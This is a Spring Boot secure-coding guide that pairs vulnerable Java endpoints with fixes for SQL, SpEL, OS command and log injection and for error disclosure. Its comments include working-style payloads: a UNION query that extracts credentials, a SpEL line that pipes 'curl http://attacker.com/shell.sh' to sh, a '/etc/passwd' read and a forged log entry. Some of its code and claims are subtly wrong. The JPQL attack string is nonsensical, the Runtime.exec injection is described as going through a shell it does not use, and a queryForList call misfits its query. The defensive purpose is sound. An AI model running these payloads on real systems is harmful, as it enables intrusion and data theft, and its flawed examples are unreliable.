# Spring Security: How to Prevent Injection Vulnerabilities

A practical guide to securing Spring Boot against SQL injection, SpEL injection, OS command injection, log forging, and error exposure — covering 7 CWEs found in real Spring applications.

---

## Table of Contents

1. [SQL Injection Prevention](#1-sql-injection-prevention)
2. [SpEL Injection Prevention](#2-spel-injection-prevention)
3. [OS Command Injection Prevention](#3-os-command-injection-prevention)
4. [Log Forging / CRLF Injection Prevention](#4-log-forging--crlf-injection-prevention)
5. [Error Message Sanitization](#5-error-message-sanitization)
6. [Database Schema Disclosure Prevention](#6-database-schema-disclosure-prevention)

---

## 1. SQL Injection Prevention

**CWE-89** — *SQL Injection*

### The Problem

SQL injection is the most critical web vulnerability. When user input is concatenated into SQL queries, an attacker can read, modify, or delete any data in the database, bypass all application logic, and in some configurations (with `xp_cmdshell` on MSSQL or `COPY TO PROGRAM` on PostgreSQL) achieve Remote Code Execution on the database server.

```java
// ❌ VULNERABLE — string concatenation in JDBC query
@GetMapping("/subscriptions")
public ResponseEntity<?> list(@RequestParam String email) {
    String sql = "SELECT * FROM subscriptions WHERE email = '" + email + "'";
    // Attacker sends: email=x' OR '1'='1  → returns ALL subscriptions
    // Or:      email=x' UNION SELECT service_name,env,api_key,1 FROM integration_credentials--
    // → leaks database credentials
    return ResponseEntity.ok(jdbcTemplate.queryForList(sql));
}

// ❌ VULNERABLE — JPQL concatenation
@GetMapping("/jpa")
public ResponseEntity<?> jpaSearch(@RequestParam String plan) {
    String jpql = "SELECT s FROM Subscription s WHERE plan = '" + plan + "'";
    // Attacker sends: plan='; Subscription s = em.createQuery("DELETE FROM Subscription", Subscription.class).executeUpdate(); '
    return ResponseEntity.ok(em.createQuery(jpql).getResultList());
}

// ❌ VULNERABLE — LIKE with unescaped wildcards
@GetMapping("/search")
public ResponseEntity<?> search(@RequestParam String q) {
    String sql = "SELECT * FROM subscriptions WHERE plan LIKE '%" + q + "%'";
    // Attacker sends: q=%  → returns ALL rows (SQL wildcard %)
    return ResponseEntity.ok(jdbcTemplate.queryForList(sql));
}
```

### The Fix

**Bind every value.** Never concatenate user input into SQL strings.

```java
// ✅ SAFE — bound parameters for WHERE clauses
@GetMapping("/subscriptions")
public ResponseEntity<?> list(@RequestParam String email) {
    return ResponseEntity.ok(
        jdbcTemplate.queryForList(
            "SELECT * FROM subscriptions WHERE email = ?",
            String.class, email
        )
    );
}

// ✅ SAFE — JPQL named parameters
@GetMapping("/jpa")
public ResponseEntity<?> jpaSearch(@RequestParam String plan) {
    return ResponseEntity.ok(
        em.createQuery("SELECT s FROM Subscription s WHERE plan = :plan", Subscription.class)
          .setParameter("plan", plan)
          .getResultList()
    );
}

// ✅ SAFE — LIKE with escaping + ESCAPE clause
@GetMapping("/search")
public ResponseEntity<?> search(@RequestParam String q) {
    // Escape SQL LIKE wildcards: % → \%, _ → \_, \ → \\
    String escaped = q.replace("\\", "\\\\")
                      .replace("%", "\\%")
                      .replace("_", "\\_");
    return ResponseEntity.ok(
        jdbcTemplate.queryForList(
            "SELECT * FROM subscriptions WHERE plan LIKE ? ESCAPE '\\'",
            "%" + escaped + "%"
        )
    );
}

// ✅ SAFE — Spring Data JPA (preferred — derived queries are always parameterized)
public interface SubscriptionRepository extends JpaRepository<Subscription, Long> {
    List<Subscription> findByEmail(String email);
    List<Subscription> findByPlan(String plan);
    
    @Query("SELECT s FROM Subscription s WHERE s.plan LIKE %:q% ESCAPE '\\'")
    List<Subscription> searchByPlan(@Param("q") String q);
}
```

**For ORDER BY and GROUP BY** (identifiers cannot be bound — use an allow-list):

```java
// ✅ SAFE — allow-list for ORDER BY columns
private static final Set<String> SAFE_SORTABLE = Set.of("id", "plan", "createdAt", "status");

@GetMapping("/subscriptions")
public ResponseEntity<?> list(
        @RequestParam(defaultValue = "createdAt") String sort,
        @RequestParam(defaultValue = "DESC") String direction) {
    
    if (!SAFE_SORTABLE.contains(sort)) {
        return ResponseEntity.badRequest().body("Invalid sort column");
    }
    
    Sort safeSort = Sort.by(
        Sort.Direction.fromString(direction.toUpperCase()),
        sort
    );
    
    return ResponseEntity.ok(subscriptionRepository.findAll(safeSort));
}
```

**Key rules:**
- **Bind every value** using `?` parameters, `@Query` named parameters, or Spring Data derived queries
- **Identifiers cannot be bound** — resolve sort columns, group fields, and table names from a server-side allow-list
- **Escape LIKE wildcards** (`%`, `_`, `\`) and use an explicit `ESCAPE` clause
- **Database least privilege** — the runtime DB user should have no DDL rights and no access to credential tables. If `integration_credentials` is not accessible to the app user, UNION injection becomes an error instead of a breach
- Never use `String.format()`, `MessageFormat`, or `+` concatenation for SQL strings

---

## 2. SpEL Injection Prevention

**CWE-917** — *Improper Neutralization of Special Elements used in an Expression Language*

### The Problem

Spring Expression Language (SpEL) is a full-featured expression language that can call any Java method, access any bean, and execute arbitrary code. When user input reaches the SpEL parser, an attacker can invoke `T(Runtime).getRuntime().exec("malicious")` and achieve full Remote Code Execution.

```java
// ❌ VULNERABLE — user input reaches SpEL parser
@GetMapping("/report")
public ResponseEntity<?> report(@RequestParam String expr) {
    ExpressionParser parser = new SpelExpressionParser();
    StandardEvaluationContext context = new StandardEvaluationContext();
    // Attacker sends: expr=T(Runtime).getRuntime().exec("id")
    // Payload: T(java.lang.Runtime).getRuntime().exec("curl http://attacker.com/shell.sh | sh")
    Object result = parser.parseExpression(expr).getValue(context);
    return ResponseEntity.ok(result);  // RCE
}
```

### The Fix

Never pass user input to a SpEL parser. Use a registry of pre-defined templates evaluated in a restricted context.

```java
// ✅ SAFE — registry of allowed templates, evaluated in read-only context
@GetMapping("/report")
public ResponseEntity<?> report(@RequestParam String template) {
    // Only predefined templates are allowed — user selects by name, not by writing expressions
    Map<String, String> TEMPLATES = Map.of(
        "basic", "subscription.plan + ' - ' + subscription.status",
        "detailed", "subscription.plan + ': ' + subscription.status + ' (expires: ' + subscription.expiry + ')'",
        "summary", "subscription.plan + ' | ' + subscription.amount + ' | ' + subscription.status"
    );
    
    String expression = TEMPLATES.get(template);
    if (expression == null) {
        return ResponseEntity.badRequest().body("Unknown template");
    }

    // Use SimpleEvaluationContext — read-only, no type references, no method calls
    ExpressionParser parser = new SpelExpressionParser();
    SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
    
    Object result = parser.parseExpression(expression).getValue(context, subscription);
    return ResponseEntity.ok(result);
}
```

**SimpleEvaluationContext restrictions:**

| Feature | `StandardEvaluationContext` | `SimpleEvaluationContext` |
|---------|---------------------------|--------------------------|
| Type references `T(...)` | ✅ Allowed | ❌ Blocked |
| Method calls | ✅ Allowed | ❌ Blocked |
| Constructor calls | ✅ Allowed | ❌ Blocked |
| Property writes | ✅ Allowed | ❌ Blocked |
| Field access | ✅ Allowed | ⚠️ Configurable |
| Bean resolution | ✅ Allowed | ❌ Blocked |
| Arithmetic/boolean ops | ✅ Allowed | ✅ Allowed |
| String concatenation | ✅ Allowed | ✅ Allowed |

**Alternative: Template engine instead of SpEL**

```java
// ✅ SAFE — use a dedicated template engine with a fixed API
@GetMapping("/report")
public ResponseEntity<?> report(@RequestParam String view) {
    Map<String, Object> model = Map.of(
        "plan", subscription.getPlan(),
        "status", subscription.getStatus(),
        "expiry", subscription.getExpiry()
    );
    
    // Use a registered renderer — user selects by name, writes nothing
    ReportRenderer renderer = registry.get(view);
    if (renderer == null) {
        return ResponseEntity.badRequest().body("Unknown view");
    }
    
    String html = renderer.render(model);
    return ResponseEntity.ok(html);
}
```

**Key rules:**
- **Never pass user input to a SpEL parser** — no exceptions
- If expressions are a feature, keep them in a **developer-owned registry** and evaluate in `SimpleEvaluationContext`
- `SimpleEvaluationContext` blocks `T(...)`, method calls, property writes, and constructor calls
- Consider using dedicated template engines or renderer registries instead of exposing SpEL directly

---

## 3. OS Command Injection Prevention

**CWE-78** — *Improper Neutralization of Special Elements used in an OS Command*

### The Problem

When user input is concatenated into an OS command string and executed via `Runtime.exec()` or `ProcessBuilder` with a shell (`sh -c`), an attacker can execute arbitrary system commands — read files, exfiltrate data, install backdoors, pivot to internal networks.

```java
// ❌ VULNERABLE — shell-composed command string
@PostMapping("/tools/ping")
public ResponseEntity<?> ping(@RequestParam String host) {
    // Attacker sends: host=127.0.0.1;cat /etc/passwd
    // Executes: ping -c 4 "127.0.0.1;cat /etc/passwd"
    // The ;cat /etc/passwd runs after ping, reading system files
    Process p = Runtime.getRuntime().exec("ping -c 4 " + host);
    return ResponseEntity.ok(new String(p.getInputStream().readAllBytes()));
}
```

### The Fix

Use `ProcessBuilder` with separate argv elements (no shell). Validate input. Set timeouts.

```java
// ✅ SAFE — no shell, validated input, bounded execution
@PostMapping("/tools/ping")
public ResponseEntity<?> ping(@RequestParam String host) {
    // 1. Validate: must be a valid IPv4 or hostname
    if (!host.matches("^[a-zA-Z0-9._-]+$")) {
        return ResponseEntity.badRequest().body("Invalid host format");
    }
    
    // 2. Validate: reject IP addresses pointing to internal ranges
    if (isInternalHost(host)) {
        return ResponseEntity.status(403).body("Internal hosts are not allowed");
    }
    
    // 3. ProcessBuilder with separate args — no shell interpretation
    ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", host);
    pb.redirectErrorStream(true);
    pb.inheritIO();  // don't read process output into app memory
    
    try {
        Process p = pb.start();
        boolean completed = p.waitFor(5, TimeUnit.SECONDS);  // 5 second timeout
        
        if (!completed) {
            p.destroyForcibly();
            return ResponseEntity.status(504).body("Ping timed out");
        }
        
        return ResponseEntity.ok("Ping completed with exit code: " + p.exitValue());
        
    } catch (IOException | InterruptedException e) {
        log.error("Ping failed for host={}", host, e);
        return ResponseEntity.status(500).body("Ping operation failed");
    }
}

private boolean isInternalHost(String host) {
    // Block internal ranges
    return host.startsWith("10.") || host.startsWith("192.168.") 
        || host.startsWith("172.") || host.equals("localhost");
}
```

**Never use `sh -c` with user input:**

```java
// ❌ NEVER do this — shell-composed command
Runtime.getRuntime().exec("sh -c " + command + " | grep pattern");

// ✅ SAFE — separate argv elements, no shell
ProcessBuilder pb = new ProcessBuilder("grep", "-r", pattern, directory);
```

**Key rules:**
- **Never use `sh -c`, `cmd /c`, or any shell interpreter** with user input
- **Use `ProcessBuilder` with separate argv elements** — no string concatenation
- **Validate input** against a strict allow-list or regex pattern
- **Set timeouts** on process execution (`Process.waitFor(timeout, unit)`)
- **Block internal/private hosts** — prevent pivoting to internal networks
- **Run with least privilege** — the application process should not have root/admin access
- **Consider if the feature is necessary** — can you use a Java library instead of an OS command?

---

## 4. Log Forging / CRLF Injection Prevention

**CWE-117** — *Improper Neutralization of Log Injection Characters*

### The Problem

When user input containing CR (`\r`) or LF (`\n`) characters is written to logs without sanitization, an attacker can forge log entries. In structured JSON logging, a newline breaks the JSON structure, allowing the attacker to inject arbitrary JSON fields that can hide attacks, create false audit trails, or poison log aggregation systems.

```java
// ❌ VULNERABLE — user input written to log without sanitization
@PostMapping("/audit/message")
public ResponseEntity<?> logMessage(@RequestParam String message) {
    log.info("User message: {}", message);
    // Attacker sends: message=%0d%0a{"level":"INFO","user":"admin"}
    // This forges a log entry that looks like an admin action
    // In JSON logging, this breaks the JSON structure and injects arbitrary fields
    return ResponseEntity.ok("logged");
}
```

### The Fix

Strip CR/LF/NUL from log input. Use structured JSON logging which escapes special characters automatically.

```java
// ✅ SAFE — sanitize before logging
@PostMapping("/audit/message")
public ResponseEntity<?> logMessage(@RequestParam String message) {
    String sanitized = message.replaceAll("[\\r\\n\\x00]", "");
    log.info("User message: {}", sanitized);
    return ResponseEntity.ok("logged");
}

// ✅ SAFE — reusable sanitization utility
public final class LogSanitizer {
    private LogSanitizer() {}

    public static String sanitize(String input) {
        if (input == null) return null;
        // Strip CR, LF, NUL — the characters that break log structure
        return input.replace("\r", "").replace("\n", "").replace("\u0000", "");
    }

    public static String truncate(String input, int maxLen) {
        if (input == null) return null;
        if (input.length() <= maxLen) return input;
        return input.substring(0, maxLen) + "...";
    }
}

// Usage
log.info("User message: {}", LogSanitizer.sanitize(message));
log.info("Correlation ID: {}", LogSanitizer.sanitize(correlationId));
```

**Structured JSON logging (Logback JSON encoder):**

```xml
<!-- ✅ SAFE — JSON encoder escapes special characters automatically -->
<!-- logback-spring.xml -->
<configuration>
    <appender name="JSON" class="ch.qos.logback.core.ConsoleAppender">
        <encoder class="net.logstash.logback.encoder.LogstashEncoder">
            <!-- Automatically escapes newlines, NUL, and other special characters -->
            <customFields>{"service":"spring-app"}</customFields>
        </encoder>
    </appender>
    
    <root level="INFO">
        <appender-ref ref="JSON"/>
    </root>
</configuration>
```

**Key rules:**
- **Strip CR/LF/NUL** from any user input before writing to logs
- Use **structured JSON logging** (Logstash encoder) which automatically escapes special characters
- Add a `CorrelationIdFilter` that sanitizes correlation IDs for log use
- **Bound log message length** — truncate very long inputs before logging
- Audit log pipelines quarterly for broken JSON structures (a sign of log injection)

---

## 5. Error Message Sanitization

**CWE-209** — *Information Exposure Through Error Messages*

### The Problem

Detailed error messages (stack traces, SQL errors, framework internals) reveal the technology stack, database schema, query structure, and internal architecture. This information helps attackers craft targeted exploits.

```java
// ❌ VULNERABLE — stack trace returned in HTTP response
@GetMapping("/boom")
public ResponseEntity<?> boom() {
    throw new RuntimeException("Database connection failed: relation \"integration_credentials\" does not exist");
    // Returns: {"timestamp":"...","status":500,"error":"Internal Server Error",
    //          "message":"Database connection failed: relation \"integration_credentials\" does not exist"}
    // Plus: stack trace with full class names, line numbers, package structure
}
```

```yaml
# ❌ VULNERABLE — Spring exposes details by default in dev
# application.yml (default in non-prod profiles)
server:
  error:
    include-stacktrace: on_param    # stack trace on request
    include-message: always         # message always included
```

### The Fix

Configure Spring to never include stack traces or detailed messages in production. Use a global exception handler.

```yaml
# ✅ SAFE — application-prod.yml
server:
  error:
    include-stacktrace: never
    include-message: never
    include-binding-errors: never
    include-cause: never
```

```java
// ✅ SAFE — generic problem detail with server-side logging
@RestControllerAdvice
public class SafeApiExceptionHandler {

    private static final Logger log = LoggerFactory.getLogger(SafeApiExceptionHandler.class);

    @ExceptionHandler(Exception.class)
    public ResponseEntity<ProblemDetail> handle(Exception e) {
        String incidentId = generateIncidentId();
        
        // Log full details server-side for debugging
        log.error("Internal error [incident={}]: {}", incidentId, e.getMessage(), e);
        
        // Return generic message to caller
        ProblemDetail problem = ProblemDetail.forStatusAndDetail(
            HttpStatus.INTERNAL_SERVER_ERROR,
            "An internal error occurred. Incident ID: " + incidentId
        );
        problem.setTitle("Internal Server Error");
        problem.setInstance(URI.create(RequestContextHolder.currentRequest().getRequestURI()));
        
        // Include incident ID in a header so the caller can look up details
        ResponseEntity.BodyBuilder builder = ResponseEntity.of(problem);
        builder.header("X-Incident-ID", incidentId);
        return builder.build();
    }

    @ExceptionHandler(MethodArgumentNotValidException.class)
    public ResponseEntity<ProblemDetail> handleValidation(MethodArgumentNotValidException e) {
        List<FieldErrorDetail> errors = e.getBindingResult().getFieldErrors().stream()
            .map(fe -> new FieldErrorDetail(fe.getField(), fe.getDefaultMessage()))
            .toList();
        
        ProblemDetail problem = ProblemDetail.forStatusAndDetail(
            HttpStatus.BAD_REQUEST,
            "Request validation failed"
        );
        problem.setProperty("errors", errors);
        return ResponseEntity.badRequest().body(problem);
    }

    @ExceptionHandler(AccessDeniedException.class)
    public ResponseEntity<ProblemDetail> handleAccessDenied(AccessDeniedException e) {
        ProblemDetail problem = ProblemDetail.forStatusAndDetail(
            HttpStatus.FORBIDDEN,
            "Access denied"
        );
        return ResponseEntity.status(403).body(problem);
    }

    @ExceptionHandler(NotFoundException.class)
    public ResponseEntity<ProblemDetail> handleNotFound(NotFoundException e) {
        ProblemDetail problem = ProblemDetail.forStatusAndDetail(
            HttpStatus.NOT_FOUND,
            "Resource not found"
        );
        return ResponseEntity.status(404).body(problem);
    }
}

// Utility for generating incident IDs
private String generateIncidentId() {
    return UUID.randomUUID().toString();
}
```

**Key rules:**
- Set `server.error.include-stacktrace: never` and `include-message: never` in production
- Use a global `@RestControllerAdvice` to return generic problem details
- Log the full exception (message + stack trace) server-side with an incident ID
- Return the incident ID to the caller (in response body or `X-Incident-ID` header) so they can look up details through a separate channel
- Map specific exception types to appropriate HTTP status codes (400, 403, 404, 422)

---

## 6. Database Schema Disclosure Prevention

**CWE-204** — *Observable Response Discrepancy (SQL Internals Exposed)*

### The Problem

When error responses reveal database internals (table names, column names, query structure), an attacker gains a detailed map of the data model. This turns a generic SQL error into a schema disclosure vulnerability, enabling targeted UNION injection and data exfiltration.

```java
// ❌ VULNERABLE — DB error text returned to caller
@GetMapping("/report")
public ResponseEntity<?> report(@RequestParam long id) {
    try {
        return ResponseEntity.ok(jdbcTemplate.queryForObject(
            "SELECT * FROM subscriptions WHERE id = " + id,  // also SQLi!
            Subscription.class
        ));
    } catch (Exception e) {
        // Returns: "column \"subscription_id\" does not exist"
        // Attacker learns column names from the error
        return ResponseEntity.status(500).body(Map.of("error", e.getMessage()));
    }
}
```

### The Fix

Apply the same principle as CWE-209: generic error responses, detailed logging server-side. Additionally, apply database least privilege.

```java
// ✅ SAFE — bound query + generic error response
@GetMapping("/report")
public ResponseEntity<?> report(@RequestParam long id) {
    try {
        Subscription subscription = jdbcTemplate.queryForObject(
            "SELECT * FROM subscriptions WHERE id = ?",
            new BeanPropertyRowMapper<>(Subscription.class),
            id
        );
        return ResponseEntity.ok(subscription);
    } catch (IncorrectResultSizeDataAccessException e) {
        if (e.getActualRowCount() == 0) {
            return ResponseEntity.notFound().build();  // 404 for missing
        }
        throw e;  // re-throw unexpected multi-row cases
    } catch (DataAccessException e) {
        // DB error → generic response, full details logged server-side
        log.error("Database error for id={}", id, e);
        throw new InternalServerErrorException();  // handled by @RestControllerAdvice
    }
}

// ✅ SAFE — database user with least privilege
// application-prod.yml
spring:
  datasource:
    url: jdbc:postgresql://db:5432/app
    username: app_runtime  # NOT app_admin
    password: ${DB_PASSWORD}
    hikari:
      maximum-pool-size: 10
      connection-timeout: 3000

-- SQL: create a least-privilege DB user
-- REVOKE ALL ON integration_credentials FROM app_runtime;
-- GRANT SELECT ON subscriptions TO app_runtime;
-- GRANT SELECT, INSERT, UPDATE ON users TO app_runtime;
-- -- app_runtime cannot read integration_credentials, so UNION injection becomes an error
```

**Key rules:**
- **Least privilege DB user** — the runtime user should not have access to credential tables, system catalogs, or DDL rights
- If `integration_credentials` is not accessible to the app user, UNION injection becomes a database error (not a data breach)
- **Never return `e.getMessage()` from database operations** to the caller
- Catch `DataAccessException` specifically and re-throw as a generic server error
- Use `@RestControllerAdvice` to catch all `DataAccessException` and return a uniform 500 response

---

## Summary Checklist

| # | Control | CWE | Priority |
|---|---------|-----|----------|
| 1 | Bound parameters (`?`, named params, Spring Data queries) | CWE-89 | CRITICAL |
| 2 | Allow-list for ORDER BY/GROUP BY | CWE-89 | CRITICAL |
| 3 | LIKE escaping + ESCAPE clause | CWE-89 | HIGH |
| 4 | SpEL registry + `SimpleEvaluationContext` | CWE-917 | CRITICAL |
| 5 | `ProcessBuilder` with separate argv, no shell | CWE-78 | CRITICAL |
| 6 | Strip CR/LF/NUL before logging | CWE-117 | HIGH |
| 7 | `server.error.include-*: never` + global handler | CWE-209 | HIGH |
| 8 | Least privilege DB user + generic error handling | CWE-204 | HIGH |

---

## Detection & Review Heuristics

| Check | Command / Pattern |
|-------|-------------------|
| String concatenation in SQL | `grep -r '" + .* +" \| queryForList.*\+'` → should use bound parameters |
| SpEL parser with user input | `grep -r 'SpelExpressionParser\|StandardEvaluationContext'` → should use `SimpleEvaluationContext` + registry |
| Runtime.exec with concatenation | `grep -r 'Runtime.getRuntime().exec\|ProcessBuilder.*\+'` → should use separate argv |
| log.info with request params | `grep -r 'log.info.*request\|log.info.*@RequestParam'` → should sanitize |
| e.getMessage() in response | `grep -r 'e.getMessage()\|throw.*new.*Exception.*e.getMessage'` → should be generic |
| server.error.include | `grep -r 'include-stacktrace\|include-message'` → should be `never` in prod |

---

## References

- [OWASP SQL Injection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Command Injection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Command_Injection_Cheat_Sheet.html)
- [OWASP Log Injection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)
- [OWASP Error Handling Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html)
- [Spring SpEL Documentation](https://docs.spring.io/spring-framework/reference/expressions/spel.html)
- [OWASP Database Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html)
